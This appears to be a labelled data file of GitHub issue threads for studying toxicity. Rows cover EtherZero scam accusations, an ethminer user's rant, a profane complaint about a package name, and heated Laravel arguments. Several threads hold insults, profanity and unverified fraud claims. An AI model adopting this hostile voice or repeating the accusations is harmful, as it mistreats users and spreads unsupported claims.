eth-phishing-detect/MetaMask/653,0.436123455,MetaMask,eth-phishing-detect,EtherZero.org is incorrectly flagged,12940,97,69,0.5,18,"Dear Meta Mask team, We found MetaMask have blocked access to our website EtherZero.org, we are making a ethereum fork and presell some coin to our early investors.  We also found some dangerous with the method to import private key into our website wallet or Meta Mask fork plugin to get EtherZero, so we will recommend users add a custom node to MEW or Meta Mask to get ETZ later. I don't know why Meta Mask block our site, it's unfair and please you can re-check it again, Thank you!  MetaMask works find on the wallet when you search (EtherZero Wallet), same goes for KeepKey and Ledger Nano. Importing private key should only be done on websites which are secured (such as  or  . Also, please correct the sending address to buy ETZ, because first it was 0xe4ba55b67b5596eaac5000b724dff7e86ad83196, then it was 0xf33068d5e798f6519349ce32669d1ec940db1193 and now it is 0x7E416ACB49c0B0d928BAda074Bf6597D80740bC2. And only the last one (0x7E416ACB49c0B0d928BAda074Bf6597D80740bC2) is mentioned in the tweets, telegram messages, websites and blogs. Please correct this.    is not our website, don't go to there! And don't send ETH to anyone address. Our pre-sale have been paused!  But ethzero.org is marked for fake and the address was removed to send ETH so that's suspicious. And no Ledger Nano support on ethzero but there is on ethzero-wallet.org ??   is our official website, don't go to others or your ETH will be stolen!  But every analytic urlscan says etherzero.org is fake??  Don't reply to my post, you can steal some ETH but just it.  Lol, no code repository, no opensource, no whitepaper and now even taken down for illegal use of MetaMask. Give me a break. Changing ETH receive address 3 times and even sending it to your own wallets back and forth. The fork is real and claiming ETZ is real, but this is just childish.  Hi Admin, Please have a look at our official telegram  and check it out what we are doing. Thanks!  @friend I am the one who issued the blacklist.  You mention it's going to be a 11 ETZ/ETH fork in your bitcointalk post, but during sale I can buy 3300ETZ for 1 ETH - this doesn't add up. Everyone is sending funds to 1 address to buy these ETZ tokens which doesn't make sense in terms of a sale - how will you track and issue tokens to who contributed what with the correct amount? There was no whitepaper (at time of blacklist) You're asking people to import their private keys into 3rd party software that isn't auditable/released and say it's the only way to get your ETZ tokens. You say your team is 20 people with cooperative tasking with top dapp shops in India and Eastern Europe yet all your repos have 1 contributor from the ETZ team (which is an anonymous contributor) and that's just changing existing ETH/MetaMask/MEW branding to ETZ. Your fork was cancelled and 5 days later open up again with zero explanation.    Hi,  It's a 11 fork but we also pre-mine 97M, and 20M will be sold to early investors amd 77M will be reserved for reservation, i don't think it's illegal. We have released everything on the get ETZ page  before investors send ETH to us.   And we have refunded all the requests investors asked. You can check our address  and  ask investor send ETH to us from a compatible wallet and we collect the sending address from etherscan.io, so we can send ETZ to their addresses later.  WP have been uploaded  have found some dangerous with the method to import private key into our website wallet or Meta Mask fork plugin to get EtherZero, so we will provide users a custom node to be added to MEW or Meta Mask to get ETZ, or you can add your notes. You can find the info have been updated at  are 20 people team, 9 core team members in China, one team located in India, one in eastern Europe to help us. It's a hard fork project, so we forked other codes including Meta Mask, but we also would like to use Meta Mask  if it's compatible. We only use it as a test wallet.   PS¬†0 TX fee have been implemented on our test wallet ETZ's test wallet has been running on the test network and can download from here¬† tutorial¬†  unzip wallet¬† open chrome//extensions/ in Chrome browser¬† drag the unzip folder to the extension interface¬† this is a Meta Mask version of the fork version of the wallet, the same as Meta Mask¬† in the telegram group you can add the administrator in private, we can send some ETZ test currency to you (only can be tested on the test net, later we will clear it).  We have explained it on our telegram before(at the first we want to hard fork ethereum, but then want to make a ICO instead as a private investor encouraged us made a ICO, but this way didn't work so we restarted the HF). It's 6180 members group, we didn't cheat anyone or their ETH, if you can proof it we won't said anything about the incorrectly flagged.   EtherZero has all the dream features needed by DAPP developers 0 TX fee, instant payments and high scalability(up to thousands of TPS). Made by Dapp developers, for Dapp developers. I thought we are doing a new ways for DAPP development, many developers will need these features. It's critical to our project as many users used Meta Mask, and we also recommended they to use Meta Mask and MEW for helding ETH to get ETZ for free for many times. If you need anything we would like to provide to you asap. Thank you very much!  Sorry ETZ -- but you've lied to every investor. Your announcement articles that lead to people investing were stating only a modest 20M premine. You've since changed this completely. You are scammers. Note You edited your announcement post on  edited your advertisements TODAY and hid evidence of this fraud. Your own employees are contacting the press and warning people not to invest. You have no way of explaining what you have done to investors. All you can do is hide the evidence and tell stories. Your whole business is based on a lie in your marketing material (that you routinely change, just like the ETH addresses you have your victims send ETH to) claiming you can handle thousands of transactions per second, zero transaction fees, and somehow survive DDOS attacks. Where is the code?  Thanks @friend for this investigation. It can't be more clear this is a huge scam.  Guys,  I think that you are all over-reacting.   I believe that the project has potential and has gained community support.  Hi, Do your research more and you will find the true. We changed the plan just want to protect our early investors, they all get 10X ETZ at the same ETH sent. Do your research more and you will find the true. No one want a refund and if they ask, we just send back their ETH. They are not our employees ever! They want to work for us, but we rejected them. So bad things happenned. We didn't want to hide anything, just bc the code is not ready, it will be open soure soon. True is true and time will tell. Be a wiser man please! ---- On Mon, 15 Jan 2018 124034 -0600 etherenvoy &lt;notifications@friend.com&gt; wrote ---- Sorry ETZ -- but you've lied to every investor. Your announcement articles that lead to people investing were stating only a modest 20M premine. You've since changed this completely. You are scammers. Note You edited your announcement post on  edited your advertisements TODAY and hid evidence of this fraud. Your own employees are contacting the press and warning people not to invest. You have no way of explaining what you have done to investors. All you can do is hide the evidence and tell stories. Your whole business is based on a lie in your marketing material (that you routinely change, just like the ETH addresses you have your victims send ETH to) claiming you can handle thousands of transactions per second, zero transaction fees, and somehow survive DDOS attacks. Where is the code? ‚Äî You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub, or mute the thread.  We changed the plan just want to protect our early investors, they all get 10X ETZ at the same ETH sent. Anyone want a refund and if they have asked, we just send back their ETH.¬† They are not our¬†employees ever! They want to work for us, but we rejected them.¬†So bad things happened. We didn't want to hide anything, just bc the code is not ready before the fork, it will be open source soon. And please read this article and you will find more interesting things  Where is the code that allows for 10,000 tx/s and unlimited scalability on the Ethereum network?Vitalik has been wasting his time working on sharding -- I'm sure he'd like to see it. Where is it? Open the repository. Let people see. Why would you take investment with an advertisement of 116M total, and then, 3 days before launch, change it to 197 M total -- giving yourselves control of the entire market people invested in thinking it was a modest, decentralized fork? There is no why -- you lied to bitcointalk.org, lied to the media, lied to investors, lied to employees doing sales for you. ETZ, if it ever exists, will be worth very little after you centralize it and give yourselves total market control without warning the people who were investing for weeks. Are you still launching on the 19th -- 3 days from now?  You must have not check our website and WP. The 10K TPS is the next phase of ETZ. Marketing plan always need to be changed to fit the resources we had. We have increased the total number of ETZ from 116M to 194M, but also provide 16.5 times of ETZ to our early investors. The price of ETZ is 10% of previous price. And we also issued refunds if anyone asked. We didn't have employees doing sales for us, just one man called David asked to work for us.  He also asked money to members from EtherZero telegram group and want to scam ppl for selling ETZ he didn't have. He is banned from the group. lol We have implemened 0 TX fee on our test wallet and testnet and the HF will be happened on 19th, Jan.  ‰Ω†ÈúÄË¶ÅÁêÜËß£‰∏Ä‰∏ã„ÄÇÊàëÊ≤°ÊúâËÆπËØà‰Ω† „ÄÇËøô‰∏çÊòØÂãíÁ¥¢„ÄÇ ‰Ω†ÂØπÂõΩÂ§ñÁöÑÊäïËµÑËÄÖÊííË∞éÔºå‰∫∫‰ª¨ÁîüÊ∞î„ÄÇ Ëøô‰∏éÊàëÁúüÁöÑÊó†ÂÖ≥„ÄÇÊàë‰ª¨Ë∞àÂÆûËØùÂèØ‰∏çÂèØ‰ª•Ôºü When you started taking investment from westerners (1) You do not have the code done (2) You did not have a white paper (3) You were claiming 116M total ETHÔºå after investment 197M. The market will be very different. ‰Ω†ÂºÄÂßãÊãøÂà∞Â§ñÂõΩ‰∫∫ÁöÑÊäïËµÑÁöÑÊó∂ÂÄô ‰∏Ä ÂèòÊàêÊ≤°ÂÅöÂ•ΩÔºå‰πüÊ≤°github ‰∫å Ê≤°ÊúâÂÆåÊàêÁöÑWP ‰∏â ÂéüÊù•ÊòØ116MÔºåÊãøÂà∞ÊäïËµÑ‰ª•Âêé‰Ω†È´òÈÄü‰∫∫ÊòØ197M„ÄÇÂ∏ÇÂú∫ÔºåÊäïËµÑ‰ºöË∂ÖÁ∫ß‰∏çÂêåÁöÑ„ÄÇ   As a chinese, I think you shouldn't be a translator as your chinese is really funny.   won't change anything on our article about you E E. Let me ask your questions  We had provide test wallet running on testnet before the presale - you didn't tell the truth  We have told our early investors WP will be updated soon, and they trusted us, and we also delivered our promise, the WP can be downloaded here  plan always need to be changed to fit the resources we had. We have increased the total number of ETZ from 116M to 194M, but also provide 16.5 times of ETZ to our early investors. The price of ETZ is 10% of previous price. And we also issued refunds if anyone asked."" - I have asked it before  Shame on you as a Chinese. EtherZero is a global project, we have many supporters from China, also many supporters from all of the world. You are hurting the reputation of EtherZero, and provide nothing else to the world.  David, your sales employee, says you didnt pay him. He says you blocked him and banned him from the channel. Why did you do this? Are you going to pay him? He worked every day getting you ""investment"" while being told the cap was 116M. You take everyone's money first, fire your sales employee with no pay, and then you ""change the marketing plan"" and give yourselves 50% of the market in premined ETH? And you think I am worried you make up a conspiracy theory about me? I was interested in your platform -- it sounded good (0 gas fee, 999999 txps). You have no code though, and so I wrote it off as a scam and warned people.  He is not our sales employee, he asked for help being an group supporter on our telegram channel. And we have paid him  are not telling the truth, we also had your chat log with David, if you want we can upload more. You can do what you want, but we won't pay you a penny as mentioned here  I do mot want your moneu, guy. This has nothing to do with me. You lent David 0.1 ETH to buy a computer power supply. That is not his monthly salary. He is a european, he does not work for 0.1 ETH a month. I have my chatlog with David too, I was talking to him, worried that your company was a scam (which it seems to be!). You are hurting people you hired, who worked for you. You are such a fool. I am just one guy who thinks you are a scam, I am not important. Welcome to cryptocurrency where your project needs code and a meaningful whitepaper to not be a scam, tough I know. You have a contract with David, he was your employee, he made you money, and you are not going to pay him. Contracts do not matter to you. You change contracts as the market needs. You got millions in investment from 116m with no code, and then changed it to 197m today. You are so bad. ",48,0,387,0.25,0.125,507,25,y,
ethminer/ethereum-mining/1405,0.14445261,ethereum-mining,ethminer,Please stop screwing with Ethminer,8198,77,60,0.615384615,2,"Please stop with all the changes. Ethminer was absolutely fine, ran and performed great. -FS exit is sorely missed here at my end. I see you have finally made amends by adding failover-timeout, which does indeed now move batch file on to next algo. -P exit did not do this, as it was advised to do! However with latest ethminer 16 dev2. A drop of speed of just over 1mhs for me. not impressed. Print out of speed and gpu speed (the same thing) what is purpose of reporting 2 speeds? why you feel the need to make changes that are not needed I dont get. etminer is, kinda was, a great miner. Now you messing around with it too much. How you have managed to mess something up that was in such great condition I do not understand. Just stop, get back to basics, sort it and leave it. This transition should have been simple.  How is -P exit different to -FS exit  should work as before and did last i checked. Also if you dont like the changes don't use the newer versions, use different miner altogether or fork and only do stuff you like in a miner.  no -P exit is not shifting batch file onto next algo nor is it behaving like -FS exit. Why do you think they have added this &gt; failover-timeout this command now exits ethminer and onto next miner. without that ethminer just loops trying to reconnect with -P exit or without.... my batch is for multi algo on mph.  1.) Report an issue and use an appropriate subject and fill it with constructive content 2.) 0.16.0.dev2 (remind the dev2) is a development snapshot - means current source compiled and bundled 3.) If you would supply us with more info like OS, GPUS, ethminer --list-devices, ... possible we can help better  getting back your missing 1MHs! 4.) failover-timeout is the time after that ethminer tries to reconnect to the main pool which is the first -P parameter (you must not specify the failover-timeout parameter !) 5.) Maybe you can explain more detailed what has changed and make problems as I still not understand Would be helpful to get (at least a part) of your batchfile to understand what's the problem 5.) If you like the old versions you can  download them at  the repo, go back in history and compile your preferred version  6.) Create PRs or Issues and submit us your sorted basics  the changes required to compensate for the mhs loss makes no difference. as the speed would be and is faster on v15, with any increments in power to gpu than v16. i got speed back. at same settings is over 16mhs on v15.... gpu is rx480 8gb ref. Al I want ethminer to do is what it did before and that is the -FS exit function. It is required to exit ethminer. I run a batch file that switches algos based on profitability, as i am sure a lot of other users do too. -P exit is not doing this for ethminer. Im terribly sorry I think I made a mistake regarding failover-timeout. I am currently testing it out and waiting on an algo switch. Im sure it did it, not 100% though. my apologies.  To have the miner exit (with -P exit) imidently after a disconnect (of any kind) you need to use --farm-retries 0  (i think thats the param) otherwise it tries to reconnect up to 3 times to reconnect to current pool before switching to new pool (which is in our case the exit command)  nope. ethminer just wont exit and move onto next algo/miner in batch. -P exit, --failover-timeout 0, --work-timeout 1, --exit, --response-timeout 2, --farm-retries 1 none of these work. just keeps looping trying to reconnect to ethash algo. and none do what -FS exit did.   Can you repeat the very same test with 0.16 please ?  And please remove --failover-timeout as it does not apply to your environment.  Also would be helpful if you could post the ""full"" command line arguments. it's not clear if you tested those one by one or in some sort of combination.  that screenshot is from latest v16dev2. those commands were entered individually. they are a list not an order  You should then test with  does that work for you? as it is not for me. ive exhausted all combos with the above. i will wait it out and see what v16 final is like. back to claymore for now (  Could you please report what is the output of ethminer.exe -V I am asking as the output of your screen-shot does not appear to belong to 0.16  sure my mistake. same thing though.   Think I got where the problem is. Please one more last test  Nevermind ... it won't allow --farm-retries 0  did you test that before you posted it? I have done that. before i even came here to make this post. if you had tested it you would not have posted it. by looks of it you have not even read the help files. im done with this for now.  First of all please calm down. We're here to help. I'm not here to undergo your rude attacks. I'm one of the devs and just now I am addressing this specific issue. (In particular I'm the one who has made most of the changes in the stratum protocol detection). So please, again, calm down and be patient.  ./ethminer -G --report-hashrate --HWMON 0 -P stratum+tcp//mhubaccount.workerx@friend.ethash-hub.miningpoolhub.com20535 --api-bind -3333 --cl-local-work 64 -P exit Results to this  think u are using wrong port number.  as far as i understand, what he wants is, that the miner exits after it gets disconnected from the pool for whatever reason. (pool closed, network error, whatever) I think that was the behavior with -FS exit.  So we should allow --farm-retries 0  and hint about that within the -P exit  command desc. I also would suggest renaming --farm-retries to something different (or alias it) like --pool-retries or something.  @friend is right. There are some topics to take into account  --farm-retries should allow 0 which means no-retry at all on a failed connection ... step to next in queue actually there is a missing check on failure for mining.authorize method which does not invalidate connection. It should instead vector of connections should be accessed by the at() method instead of direct random access [] as we're removing invalidated connections. Direct random access [] does not throw if out of bounds while at() does. Problem is vector.erase method apparently rearranges it's internal array   Figure this where you have a vector of 2 elements (thus size() is 2) you'd expect vector now holding only 1 element (and in fact is) after removal of the first (of two) element. But here comes the problem. If you access vector like this  ‚ô†cout &lt;&lt; m_connections[0].Host();` instead of getting the first (and only) element left (which should be reasonable) you get some sort of unspecified behavior which outputs data from some randomly allocated memory.  Correct, but this doesn't excuse the issuer's behaviour.  @friend my behaviour? I am just tired with users like you who post nonsense. wrong port? really? what a waste of your time posting that message only to conclude that I am using wrong port.... you are wrong. @friend I am calm (do you see any caps or exclamation points?. was more bewildered than anything when I read your reply. you said to try something that does not work and is not a valid setting for that command.... @friend most sense relating to -FS exit function I have read. thanks  Well your choice of words for the initial issue. Instead of filling out an issue ticket based on the template and describing the problem -P exit does not work for your use-case, while -FS exit worked before,  You did a bit of a rant )  @friend ... there are many ways to appear rude and those do not necessarily imply usage of capital letters or exclamation points. Everyone here uses his/her time on voluntary basis, not being paid, only guided by the desire to help and to improve. Full stop. We do not owe you anything and you don't pay anything for using this software. This said I apologize for giving you a wrong advice but have you counted how many lines of code there are and how many devs contributing ? Sometimes, as we're all human, we make mistakes or, simply, do not recall well which was the correct syntax and/or range of values. If you do not understand this please stay with Claymore which, as you pay a fee for it's usage, should give you a SLA. But I am pretty sure there's not ! This ticket is closed and on hold. Bye. ",23,6,364,0.230769231,0.153846154,133,13,y,
face_recognition/ageitgey/311,0.18437235,ageitgey,face_recognition,module naming,366,4,1,0.666666667,0,seriously some of us are drunk why do you have to name it face_recognition do you know how many time i have to hit backspace just to type that right why the fuck you cant just call it frec or facer seriously facer sounds so much cooler anyways. better have a damn good answeer. the fuck u think this is? a game?  User blocked and reported  User blocked and reported ,0,0,5,0.333333333,0,2,2,y,
forgottenserver/otland/2494,0.55171845,otland,forgottenserver,monster look direction,1006,14,1,0.7,2,"Expected behaviour  behaviour  And the problem is?  @friend  try it out yourself and compare with the image i provided, you can do so by trapping a monster and walk around it and see which direction it is facing. the problem is that the direction is not coded correctly for monster in some squares.  @friend You are filing a bug, i think you should post both expected and actual behavior. You posted expected in an image. Then post the actual in a companionable image.  @friend or you can just recode it after the expected image, i don't see a point in making another image of the broken code (which i did include btw). feel free to spend that time yourself making the image if you really think it is needed.  You are reporting a bug and expects that we try based on a image?! Please provide more information about it and not just a stupid image that you think that it should be.  and you expect me to sit another 30min to draw you a picture instead of just clicking a link that takes 30seconds. wtf dude? ",4,0,22,0.1,0.2,7,4,y,
framework/laravel/24848,0.237775175,laravel,framework,tiny bracket issue,801,4,13,0,5,"‚ô† Please use this issue tracker only for reporting Laravel bugs.  If you need support, please use the forums  -   -  you may use Slack ( or Stack Overflow ( you would like to propose new Laravel features, please make a pull request, or open an issue at  Version 5.6  Description Authentication problem due to syntax error. Steps To Reproduce in framework/src/Illuminate/Auth/SessionGuard.php file on line 380 change fromreturn !(is_null($user) &amp;&amp; $this-&gt;provider-&gt;validateCredentials($user, $credentials));`  What's the problem? Your suggestion completely changes the behavior of .  sorry my bad, this attitude always return true but ‚ô†$this-&gt;provider-&gt;validateCredentials($user, $credentials)` part is always returning false even credentials are true, I couldn't figure it out why ",3,0,59,0,0,22,2,n,
framework/laravel/2513,0.085457625,laravel,framework,[Request] Form number input helper,935,4,7,0,3,"Can we get some form helper for Laravel for the likes of &lt;input id=""movie"" type=""number"" value=""0""/&gt;  More info on the number input at  Is this too hard?  Don't need the attitude. If you look at the form helpers, there's a pattern [[ Formtype ]] Formtextarea Formtext Formselect So I suggest Formnumber  It should be merit to ask if the existing structure if too hard to implement or too limiting which need to result for an alias to be added. Anyway it been asked/request before and the response was  Alrighty then. This would hardly be an alias though of something already there, it would just be a new helper.  Formnumber only if you to create the method inside of FormBuilder. You should call {{ Forminput('number', 'name of input') }}  You can use this file to create alias for the remaining 11 HTML5 elements (email &amp; URL are enabled out of the box)  enables Inputdate('input_name', 'input_value', $options_array), etc ",6,1,57,0,0,31,1,n,
framework/laravel/26340,0.3231665,laravel,framework,Are we still doing breaking changes in minor releases?,5268,49,48,1,2,"So back in January I created issue #22833 wondering about the state of releases since many of them contained breaking changes. Now since the release of 5.7 it seems the situation still hasn't improved. For example, in the 5.5 changelog we can see 5.5.43 has a change which states Now, excuse me if I am being stupid here, but on Laravel's own website, it says The worst part is that this was only reverted 32 days later, after people had already upgraded and then had to revert those changes back to the old way. I cannot understand how/why this was ever accepted into a minor release when you clearly state breaking changes should never occur in minor releases. Notice the 'never' in bold right there. However, in 5.5.40 we saw In 5.7.11 In 5.7.8 5.7.5 My advice to people using this framework don't upgrade minor versions, if you do things will randomly break, and a revert could be sent in after a month causing another breaking change after people had updated the framework, adapted to the breaking change and then had to revert those changes again. Completely amateur and taylorotwell clearly does not care about 'breaking the user'. Maybe he needs a chat with Linus Torvalds.  You're right. They shouldn't contain breaking changes. Unfortunately with such a large user base, edge cases will happen and things will slip in. When we're notified about those we do our best to revert those changes back and undo any wrong-doings. Sometimes this means that some time can creep in between the released breaking change and the fix. Software development can be hard and by no means we intentionally want to break people's systems and apps. Software without bugs doesn't exists and is a myth. But we do our utmost best to keep these breaking changes to a minimum. This couldn't be further from the truth. If all you're going to do is complain then please refrain from opening up issues. Use  if you want to propose a new release schedule and have a civilized discussion about it.  @friend thanks for closing the issue and completely removing the chance for meaningful discourse. I admit I come across strongly only because I reported this in January and we're still seeing the same thing release after release. Yet you didn't address why the changelog has, in capital letters ""BREAKING CHANGE"". How those words ever made it into a changelog for a minor LTS release is beyond me, then it was reverted after 32 days... This was quite clearly, quite obviously intentional. We're not talking about bugs here, which are understandable, but people making PR's without realizing the impact they have on actual end users and applications. Instead, you bury your head in the sand, pretend the issue doesn't exist (or more obviously, you don't care) rather than trying to figure a viable medium, such as what I proposed before RC's or betas like most semver applications. If Taylor cared, he'd stop shipping as often and actually test his releases, but as it stands, we get reverts every 3 or so releases. And so it will continue. I have no doubt I'll be back for 5.10 or 6.3 and the same merge-oops-it-broke-revert system you guys have going will still be in effect.  A few things to note. The ""issues"" for this repository is for reporting bugs. The laravel/ideas repo is for these discussions. This is why the issue was closed. Secondly, you make some good points, but as a long time user of other large frameworks, breaking changes slip through sometimes, then get reverted. Last, you should never update composer dependencies on a production project without fully vetting in a dev environment. Even patch, now called ""minor"", releases can have occasional breaking changes with regard to bug-fixing and security. Blindly running composer update without checking the changelog or ""releases"" page, is a recipe for disaster. If the changelog isn't clear, look at the actual commits. If your app is that important, you should at least scan every change that is made to the code base before using. Even so, there could be more time available for PRs to be vetted by the community to help recognize breaking changes before the code is pushed.  Some of the unfortunate breaking changes could have easily been avoided. Or, at least, the filesystem change break. When I first saw the PR it had alarm signs all over it yet this was done on 5.7 (and merged and reverted, etc.), rather on 5.8. For my taste, way too much things are ""changed"" in minor version. Except changes to tests, I think half of that stuff should go in 5.8 or master. But understandably, contributors are eager to get their stuff out and in again on their project due to the rapid release and this attracts contributors. But here we've good/strong react from the other side, off-putting/discouraging. A fun little Epiphany I just had because I commented on   people go ~berserk~ totally strong on all the fiddle formatting rules, yet breaking changes rather easily creep into releases‚Ä¶ |  @friend they don't care otherwise they would implement changes to ensure breaking changes are impossible (RC's and betas for example). Guess it's easier to merge and revert users be damned. Shame but it is what it is, they're not good at taking criticism that hurts their egos, especially Taylor who seemingly can do no wrong... ",23,10,178,0,0,99,0,y,
framework/laravel/26828,0.168803098,laravel,framework,Eager loading with specific fields should include Relationship's keys by default.,1508,5,14,0.5,3," Laravel Version 5.6.29 PHP Version 7.1.21 Database Driver &amp; Version MySQL 5.7  Description  above warning seems to be not accurate since not only the 'id' column must be included, but also any other 'foreign key' and 'local key' of the relationship being eagar-loaded, otherwise it'll fail without them manually specified. First off, the documentation is warning users about the usage inaccurately. Secondly, it seems unnecessary for us to manually specify the foreign &amp; local keys when using ""with()"", since the ""relationship"" already dictates their necessity in facilitating the eagar-loading. Why not just automatically include them by default? Steps To Reproduce  Heya, unfortunately we don't support that Laravel version anymore. Can you please try to upgrade and see if the problem persists?  The quoted documentation clearly says 5.7 correct? It does say we need to manually specify id instead of automatically handled by the framework, correct? So why is this closed so quickly merely because I stated an outdated version? I can test any way I choose to but this quick closing of an issue is not allowing healthy discussion sadly.  @friend you've reported an issue for Laravel 5.6  This idea has been declined  @friend everyone knows that, and you've closed it, heh.  @friend we don't support 5.6 anymore  There have also been multiple (unsuccessful) attemps to improve this sentence in the documentation.  If all you're going to do is complain then please refrain from posting issues ü§∑üèª‚Äç‚ôÇÔ∏è ",4,0,58,0,0.25,33,5,y,
framework/laravel/5355,0.087617948,laravel,framework,[Request] Eloquent should support composite keys,14762,220,123,0,0,"Eloquent assumes heavily that you are using surrogate keys on your tables (the  field in every table). However in real world usage, particularly older database systems not designed with web frameworks in mind, there are often tables with composite keys. That is, the primary key is over two or more columns. Often, you can't just add autoincremented id's. This is definitely a game stopper for a lot of use-cases, where you are forced to access existing RDBMS (e.g. building a frontend for an existing db). See also this reddit post about this issue. The schema builder has already support for composite keys, however eloquent doesn't seem to support it yet. I request the feature to use composite keys in your eloquent models and queries. The default configuration for surrogate keys is fine, just add the option.  I would like to have this supported too.  Me too.  I agree, this is extremely annoying at the moment. Unfortunately I'm not in charge of a lot of data I need to access. For the moment, I'm just overriding  in my models by doing something like  @friend this is a good workaround. So did you specify  with one field and added the second field as a where-clause in the newQuery method?  You could view my bug report (#5517) which has a work-around that works flawlessly for me.  @friend Yes, that is exactly what I did. In my case I was using a  and a bunch of child classes that extended my , so I had a  and a .  I would really like to have this supported as well.  I put this in my Eloquent Model subclass to enforce my extra column ('locale').  Maybe it'll help someone. ‚ô†php     protected function setKeysForSaveQuery(Builder $query)     {         parentsetKeysForSaveQuery($query);         $query-&gt;where('locale', '=', $this-&gt;locale);         return $query;     }  plus one I just get an common error while saving model with composite keys‚ô†`  I want it!  -1 This is not ""should"" stuff. Please keep Eloquent simple. As you mentioned, query builder supported it, so it is enough. Don't do every thing by Eloquent. Just use query builder, results became collections in L5, so what problem?  I doubt this will ever happen.  Why do you doubt this will ever happen? Composite keys are extremely common, if the SchemaBuilder supports it why wouldn't you want to have it supported by Eloquent as well? Sometimes using surrogate keys are wasteful, especially if you're using UUIDs as identifiers... having a useless column you never search on that just takes up table &amp; index space is silly sometimes. Keeping Eloquent ""simple"" is a very silly reason. To the end-user nothing changes - but they now have the ability to specify an array for the primary key. If Laravel/Eloquent really expects to be taken seriously and provide further credit for using PHP for web development it should naturally support what every other ORM supports for alternative web development libraries. Using pivot only is doable when you have a few extra columns on your relation... otherwise it's very awkward. Using the query builder for saving &amp; deleting is kind of silly, why would anyone want those inconsistencies in their code? Some places you use Eloquent for saving/deleting and some places you use QueryBuilder? This kind of attitude is poor and sounds lazy. If Laravel is open to receiving a feature like this, I would be more than willing to supply a nice simple and efficient solution.  plus one Maybe in 90% of my projects I use composite primary keys. For localisation and for one to many relationships composite keys is the best practice for me... I'm very dissapointed that in Laravel 5 there is no composite keys, but a lot of complicated design patterns. That is my opinion. Don't want to argue with anyone.  Eloquent follows the Active Record convention, so it needs a single primary key to work. If you need composite keys in your project, maybe Eloquent isn't the best tool for it.  The Active Record pattern makes no restrictions about primary keys - I don't know where you're getting that from. Eloquent/Laravel is currently developed to work with a single primary key, there's no reason why someone shouldn't be able to make a contribution to the project which adds composite keys. What is the best way to go about this?  All I'm saying is that this is a convention in other frameworks as well. Since Rails made it popular, the other frameworks followed the same path, that's what we see out there with most PHP frameworks (except Yii 2, for what I know). Don't get me wrong, I would love to see Eloquent working with composite keys but I agree with Campbell, we're not going to see that happen so soon and my opinion is that I don't think it's worth the trouble. Well, only Taylor can tell )  If the current contributors aren't interested in implementing this feature, I'm more than willing to submit how I'm going to solve it (so I don't waste my time and have it be later rejected) - I just don't know who exactly to message to get the go ahead to work on it.  Please pose questions to Taylor. He's the only one that can say yes/no to proposals.  As things stand, this issue is rejected, so it's unlikely for this to make it into the framework.  @friend are you willing to accept a pull request for this proposal?  @friend please respond, I'd love this  Just hit this bump as well. Would love support for composite keys.  I want this feature badly.  This seems like a package waiting to happen more than something that needs to be added to the framework. I agree with @friend . Just switch out your ORM to Doctrine 2? Is that a logical solution? Article here Doctrine Composite Keys  Yes this would be great to have.  I would also love to see this being implement within Eloquent.  Why would it be rejected as a proposal? If the $primaryKey property could be an array of columns it would be awesome.  plus one for composite primary key support  More one L5 user needs composite key =&gt; me !!!  Its works!!!  I ignored the model of the relationship table and set ""belongsToMany"" in the two tables with a little details set the two  foreign key of two tables and set the name of the relationship table. The whole foreign keys will works like a composite key. Ex //--------- Model ""Table1"" ------------// class Table1 extends Model { ... public function table2()     {         return $this-&gt;belongsToMany('App\Table2', 'table_relashionship', 'id_table2', 'id_table1');     } } //--------- Model ""Table2"" ------------// class Table2 extends Model { ... public function table1()     {         return $this-&gt;belongsToMany('App\Table1', 'table_relashionship', 'id_table1', 'id_table2');     } } Now the Eloquent undestand that you have a 'table_relashionship' in your database with columns 'id_table1' and 'id_table2' and you can access the data with the comand $table1 = Table2find(1); dd($table1-&gt;table2) Its solve my problem!  plus one for composite primary keys. In my opinion, using composite primary keys gives more clarity of the code as it shows that it is a dependent model (aggregate) of an entity model. Thus,  the dependent model cannot exists without its parent entity (or the aggregate root).  I am BAFFLED by the decisions being made. This is a COMMON practice in database design, and pushing people to hack their table designs to work with eloquent rather than support such a common practice is insane to me.  @friend to be fair, it is not supported by Rails either. It is not as if every major framework supports this and Laravel is refusing to.  @friend I'm in the same camp, I realize it's not a super requested feature, and even less so with new developers. And true, lots of other frameworks haven't done this either. It's actually a great thing that people are asking - what I hear them saying is they want to use Laravel! I feel like there are a few options for those of us in need of this functionality 1) Don't use eloquent, use query builder instead. 2) Don't use eloquent, use a different ORM like doctrine 3) Fork Eloquent to a new project and update it to support CK - let those that need it pull from that repo. Taylor can you share your vision of where Composite Keys fit in Laravel long term? i.e. Are CK's something you see as desirable, just further down the roadmap? Or are CK's something you feel are not a good fit for what you're trying to do with Laravel?  Jack   I currently have no plans to implement composite key support. On Thursday, June 25, 2015, Jack notifications@friend.com wrote  Thanks Taylor, I appreciate the clarity!  Extend Laravel, make a package, release it and then all the peoples can use it. Just because its not part of the framework doesn't mean this can't be done.  @friend A fork might be more appropriate. I've looked through all of the code myself and refactoring it to include composite keys provides an opportunity to clean up the code a bit (all of the joins due to relationships has a lot of repetitive string concatenation code). I think if you write out the few different ways to add conditions &amp; joins to a query in separate methods (on a new class?) it will give you a single place to handle the composite key logic instead of all over the Eloquent code base. Just my 2c  @friend Agree 100%, still a little way to go (I was crazy busy last week) but I've made good progress so far. I'm updating the database tests as I go which is a big time sink.  I would enjoy seeing this myself too but I'm okay using the query builder to get the job done. It means I will have to update the timestamps myself but nothing major.  @friend I tried using query builder and I've got it working, but it's a ton more work, since you can't just assign the request data to the ORM to have it save a new record. So lots of mundane code to assign each and every field. @friend How is progress going on the fork?  I've considered trying doctrine, but I think a fork of Eloquent would be easier to use.  It's confusing that the builder can create primary composite keys while the Eloquent can't, kind of inconsistent, isn't it?  @friend Not really. I'm pretty sure there are people who use the schema and query builder without Eloquent models.  @friend I'd argue that it's actually quite a disconnect between two integral parts of the framework.  One can build schema in such a way that it can't be used with the existing Eloquent API. It feels like a fight with the tooling, which is a red flag to me. The fact that these tools can be used independently is great but I think they should work together with feature parity in the first instance.  plus one for composite primary keys.  Me too. plus one for CK.  I was just silently listening this thread for a year, still nothing new? I'm playing with the idea of coding an Eloquent extension specifically for supporting comp keys until this feature comes out.  this should be locked  lol - I don't lock issues anymore because it causes massive rage  Why should this issue be locked?  Because of what Taylor said about this feature  So just because other frameworks don't support it means Laravel doesn't need to? In fact I would think this would be a driving force TO support it since it will be yet one more feature it has that other frameworks don't.  I (and a lot of others) totally agree with you. It's quite a common thing to use in database tables that simply don't require a 'id' field.  Taylor's response is interesting. It could one of a few things.  He doesn't think Laravel can/should be better than Rails. He knows this is an excuse for not wanting to do it himself. Could be 